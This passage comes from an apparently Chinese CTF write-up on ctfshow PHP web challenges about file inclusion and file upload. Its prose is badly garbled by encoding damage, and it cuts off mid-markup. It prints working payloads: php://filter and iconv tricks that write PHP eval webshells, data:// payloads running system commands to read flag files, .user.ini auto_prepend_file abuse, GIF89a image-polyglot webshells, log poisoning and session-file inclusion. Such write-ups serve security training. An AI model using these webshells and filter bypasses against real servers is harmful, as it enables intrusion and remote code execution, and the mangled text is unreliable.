class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"&lt;?php die('å¤§ä½¬åˆ«ç§€äº†');?>"</span><span class="token punctuation">.</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆäº†è§£ä¸€äº›<a href="https://blog.csdn.net/Swocky/article/details/86741674?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242" target="_blank" rel="noopener">base64ç¼–ç çš„åŸç†</a></p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#_1" target="_blank" rel="noopener">è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨ |pç¥çš„æ–‡ç« </a></p><h3 id="æ­¥éª¤ï¼š"><a href="#æ­¥éª¤ï¼š" class="headerlink" title="æ­¥éª¤ï¼š"></a>æ­¥éª¤ï¼š</h3><p>1.åˆ©ç”¨girä¼ å‚å†³å®šä»¥base64çš„æ–¹å¼å†™å…¥1.php</p><p>2.ç”±äºbase64ç‰¹æ®Šç¬¦å·åªè¯†åˆ«/+æ‰€ä»¥å¤šåŠ ä¸¤ä½å¯†æ–‡å­—æ¯åšåˆ°4çš„æ•´æ•°ä½æ¥ä½¿å…¶ç¬¦åˆbase64çš„ä½æ•°</p><h3 id="payloadï¼š"><a href="#payloadï¼š" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h3><pre><code>?file=php://filter/write=convert.base64-decode/resource=666.phpè¿™ä¸ªåœ°æ–¹getä¼ å‚éœ€è¦ä¸¤æ¬¡urlç¼–ç content=yyPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==æ­¤å¤„base64è§£ç ï¼š&lt;?php @eval($_POST[1]);?&gt;</code></pre><p>ç„¶åè®¿é—®666.phpé…åˆhackbaræ‰§è¡Œä¸€å¥è¯æœ¨é©¬å³å¯</p><h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>dataä¼ªåè®®å°±èƒ½è¿‡</p><pre><code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOyA/Pg    //&lt;?php system(&quot;ls&quot;); ?&gt;åˆ é™¤äº†æœ€åçš„ä¸¤ä¸ª==?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmwwZy5waHAiKTsgPz4    //&lt;?php system(&quot;cat fl0g.php&quot;); ?&gt;åˆ é™¤äº†æœ€åçš„ä¸€ä¸ª=</code></pre><h2 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i'</span><span class="token punctuation">,</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'contents'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string">"&lt;?php die();?>"</span><span class="token punctuation">.</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ©ç”¨å„ç§ç¼–ç ç»•è¿‡ï¼š</p><p><a href="https://xz.aliyun.com/t/8163#toc-12" target="_blank" rel="noopener">file_put_contentå’Œæ­»äº¡Â·æ‚ç³…ä»£ç ä¹‹ç¼˜ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><pre><code>iconv ( string $in_charset , string $out_charset , string $str ) : stringå°†å­—ç¬¦ä¸² str ä» in_charset è½¬æ¢ç¼–ç åˆ° out_charsetã€‚in_charsetï¼šè¾“å…¥çš„å­—ç¬¦é›†ã€‚out_charsetï¼šè¾“å‡ºçš„å­—ç¬¦é›†ã€‚</code></pre><p>åˆ©ç”¨è„šæœ¬ï¼ˆphpç‰ˆæœ¬éœ€è¦æ§åˆ¶åœ¨5.2å·¦å³ï¼‰ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string">"UCS-2LE"</span><span class="token punctuation">,</span><span class="token string">"UCS-2BE"</span><span class="token punctuation">,</span><span class="token string">'&lt;?php @eval($_POST[hack]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//?</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hp</span> <span class="token attr-name">pe@av(l_$OPTSh[ca]k;)</span><span class="token punctuation">></span></span></span><span class="token operator">?</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºæ˜¯ä¸¤ä½è¿›è¡Œä¸€æ¬¡åè½¬ï¼Œæ‰€ä»¥è¦å°½é‡ä¿è¯ä½ çš„æ€»å­—ç¬¦ä¸²ä½æ•°ä¸ºå¶æ•°</p><h3 id="payloadï¼š-1"><a href="#payloadï¼š-1" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h3><pre><code>?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpcontents=?&lt;hp pe@av(l_$OPTSh[ca]k;)&gt;?</code></pre><p>getshellï¼ï¼ï¼</p><h1 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h1><h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p>user.iniå®˜æ–¹æ–‡æ¡£ï¼š</p><pre><code>è‡ª PHP 5.3.0 èµ·ï¼ŒPHP æ”¯æŒåŸºäºæ¯ä¸ªç›®å½•çš„ INI æ–‡ä»¶é…ç½®ã€‚æ­¤ç±»æ–‡ä»¶ ä»…è¢« CGIï¼FastCGI SAPI å¤„ç†ã€‚æ­¤åŠŸèƒ½ä½¿å¾— PECL çš„ htscanner æ‰©å±•ä½œåºŸã€‚å¦‚æœä½ çš„ PHP ä»¥æ¨¡å—åŒ–è¿è¡Œåœ¨ Apache é‡Œï¼Œåˆ™ç”¨ .htaccess æ–‡ä»¶æœ‰åŒæ ·æ•ˆæœã€‚é™¤äº†ä¸» php.ini ä¹‹å¤–ï¼ŒPHP è¿˜ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æ‰«æ INI æ–‡ä»¶ï¼Œä»è¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶æ‰€åœ¨ç›®å½•å¼€å§‹ä¸€ç›´ä¸Šå‡åˆ° web æ ¹ç›®å½•ï¼ˆ$_SERVER[&#39;DOCUMENT_ROOT&#39;] æ‰€æŒ‡çš„ï¼‰ã€‚å¦‚æœè¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶åœ¨ web æ ¹ç›®å½•ä¹‹å¤–ï¼Œåˆ™åªæ‰«æè¯¥ç›®å½•ã€‚åœ¨ .user.ini é£æ ¼çš„ INI æ–‡ä»¶ä¸­åªæœ‰å…·æœ‰ PHP_INI_PERDIR å’Œ PHP_INI_USER æ¨¡å¼çš„ INI è®¾ç½®å¯è¢«è¯†åˆ«ã€‚</code></pre><p>.user.iniæ–‡ä»¶</p><pre><code>auto_append_file=hack.pngauto_prepend_file=hack.png</code></pre><p>æ­¤æ–‡ä»¶ä½¿ç”¨å…¶ä»–è¦æ±‚ï¼š</p><p>åŒç›®å½•ä¸‹æœ‰phpæ–‡ä»¶æ¥åŒ…å«ä½ ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶</p><h2 id="web154-155"><a href="#web154-155" class="headerlink" title="web154-155"></a>web154-155</h2><p>å°è¯•ä½¿ç”¨çŸ­æ ‡ç­¾ç»•è¿‡<br>å¯¹äºphpçš„æ ‡ç­¾å…¶ä»–å†™æ³•ï¼Œæˆ‘ä»¬è¿™é‡Œå¤šè¯´å‡ ç§<br>1ã€</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?</span> <span class="token keyword">echo</span> <span class="token string">'123'</span><span class="token punctuation">;</span><span class="token delimiter">?></span>å‰ææ˜¯å¼€å¯é…ç½®å‚æ•°short_open_tags<span class="token operator">=</span>on<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2.</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token punctuation">(</span>è¡¨è¾¾å¼<span class="token punctuation">)</span><span class="token delimiter">?></span>  ç­‰ä»·äº <span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token punctuation">(</span>è¡¨è¾¾å¼<span class="token punctuation">)</span><span class="token delimiter">?></span>ä¸éœ€è¦å¼€å¯å‚æ•°è®¾ç½®<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>3ã€</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">echo</span> <span class="token attr-name">'123';%</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‰ææ˜¯å¼€å¯é…ç½®å‚æ•°asp_tags=onï¼Œç»è¿‡æµ‹è¯•å‘ç°7.0åŠä»¥ä¸Šä¿®æ”¹å®Œä¹‹åä¹Ÿä¸èƒ½ä½¿ç”¨ï¼Œè€Œæ˜¯æŠ¥500é”™è¯¯ï¼Œä½†æ˜¯7.0ä»¥ä¸‹ç‰ˆæœ¬åœ¨ä¿®æ”¹å®Œé…ç½®åå°±å¯ä»¥ä½¿ç”¨äº†ã€‚<br>4ã€</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span>â€phpâ€</span><span class="token punctuation">></span></span><span class="token script language-javascript">echo <span class="token string">'123'</span><span class="token punctuation">;</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸éœ€è¦ä¿®æ”¹å‚æ•°å¼€å…³ï¼Œä½†æ˜¯åªèƒ½åœ¨7.0ä»¥ä¸‹å¯ç”¨ã€‚<br>å¯¹äºè¯¥é¢˜ï¼Œæˆ‘ä»¬å¯ç”¨ä½¿ç”¨<code>&lt;?=(è¡¨è¾¾å¼)?&gt;</code>è¿›è¡Œç»•è¿‡ï¼Œå›¾ç‰‡å†…å®¹<code>&lt;?=eval($_POST[1]);?&gt;</code><br>å‰©ä¸‹çš„æ­¥éª¤åŒ153</p><h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>åœ¨å‰é¢çš„åŸºç¡€ä¸Šè¿‡æ»¤äº† <code>[]</code>é‚£æˆ‘ä»¬ç›´æ¥ç”¨{}æ¥ä»£æ›¿<br>å›¾ç‰‡é©¬å†…å®¹<code>&lt;?=eval($_POST{1});?&gt;</code></p><h2 id="web157-158-159"><a href="#web157-158-159" class="headerlink" title="web157 158 159"></a>web157 158 159</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?</span><span class="token operator">=</span>`tac <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>f<span class="token operator">*</span>`<span class="token delimiter">?></span><span class="token comment" spellcheck="true">//159è¿‡æ»¤äº†æ‹¬å·å¯ä»¥ç”¨è¿™ä¸ªç»•è¿‡</span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'tac ../f*'</span><span class="token punctuation">)</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h2><p>åˆ¶ä½œå›¾ç‰‡é©¬</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token keyword">include</span><span class="token string">"/var/lo"</span><span class="token punctuation">.</span><span class="token string">"g/nginx/access.lo"</span><span class="token punctuation">.</span><span class="token string">"g"</span><span class="token delimiter">?></span>copy <span class="token number">1</span><span class="token punctuation">.</span>png<span class="token operator">/</span>b <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">.</span>php<span class="token operator">/</span>a cnm<span class="token punctuation">.</span>png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åˆ©ç”¨.user.ini</p><pre><code>auto_prepend_file=&quot;cnm.png&quot;</code></pre><h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h3><p>UAå¤´æ³¨å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œèšå‰‘è¿æ¥å³å¯</p><p>upload.phpæºä»£ç ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"msg"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$filesize</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$filesize</span><span class="token operator">></span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"msg"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"æ–‡ä»¶è¶…è¿‡1024KB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'image/png'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$ext_suffix</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ext_suffix</span><span class="token operator">!=</span><span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string">"php"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span> <span class="token operator">&amp;&amp;</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"upload/"</span><span class="token punctuation">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"msg"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"upload/"</span><span class="token punctuation">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"msg"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"æ–‡ä»¶ç±»å‹ä¸åˆè§„"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"msg"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"æ–‡ä»¶ç±»å‹ä¸åˆè§„"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"msg"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"æ–‡ä»¶ç±»å‹ä¸åˆè§„"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/php|\{|\[|\;|log|\(| |\`/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h3><p>cnm.pngä¸­çš„å†…å®¹ä¸ºï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token keyword">include</span><span class="token string">"ph"</span><span class="token punctuation">.</span>"p<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/convert.base64-encode/resource=../flag.p"."hp"?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h2><p>åœ¨160çš„åŸºç¡€ä¸Šåˆ¶ä½œä¸€ä¸ªåˆæ ¼çš„å›¾ç‰‡é©¬</p><h3 id="è€ƒç‚¹ï¼š"><a href="#è€ƒç‚¹ï¼š" class="headerlink" title="è€ƒç‚¹ï¼š"></a>è€ƒç‚¹ï¼š</h3><p><a href="https://blog.csdn.net/weixin_43915842/article/details/90183305" target="_blank" rel="noopener">æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¹‹getimagesize()ç±»å‹éªŒè¯</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">GIF89A</span><span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token keyword">include</span><span class="token string">"ph"</span><span class="token punctuation">.</span>"p<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/convert.base64-encode/resource=../flag.p"."hp"?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç„¶åè®¿é—®uploadä¸‹é¢çš„index.phpå°±å¯ä»¥äº†</p><h2 id="web162-163"><a href="#web162-163" class="headerlink" title="web162-163"></a>web162-163</h2><p>è€ƒæŸ¥ç‚¹æ˜¯sessionæ–‡ä»¶åŒ…å«ï¼Œå› ä¸ºæœ‰session_upload_process.cleanupå­˜åœ¨ï¼Œæ‰€ä»¥éœ€è¦ç«äº‰ä¸€ä¸‹</p><p>ç»§ç»­æ„é€ .user.iniæ–‡ä»¶</p><pre><code>GIF89Aauto_prepend_file=&quot;png&quot;</code></pre><p>sessionæ–‡ä»¶é»˜è®¤å‚¨å­˜è·¯å¾„</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sessions<span class="token operator">/</span>sess_PHPSESSID<span class="token operator">/</span>tmp<span class="token operator">/</span>sess_PHPSESSID<span class="token operator">/</span>tmp<span class="token operator">/</span>sessions<span class="token operator">/</span>sess_PHPSESSID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œéœ€è¦æœ¨é©¬æ–‡ä»¶çš„åå­—ä¸ºpng</p><pre class="line-numbers language-php"><code class="language-php">GIF89a<span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token keyword">include</span> <span class="token operator">/</span>tmp<span class="token operator">/</span>sess_yn8rt<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æˆ–è€…ç›´æ¥.user.ini</p><pre><code>GIF89aauto_append_file=/tmp/sess_yn8rt</code></pre><p>ç„¶ååˆ©ç”¨è„šæœ¬å‘åŒ…(æœ¬äººè¯•éªŒå¤±è´¥ï¼Œå¹¶ä¸”ç”¨bpä¹Ÿå¤±è´¥äº†)</p><pre class="line-numbers language-python"><code class="language-python"><span class="token 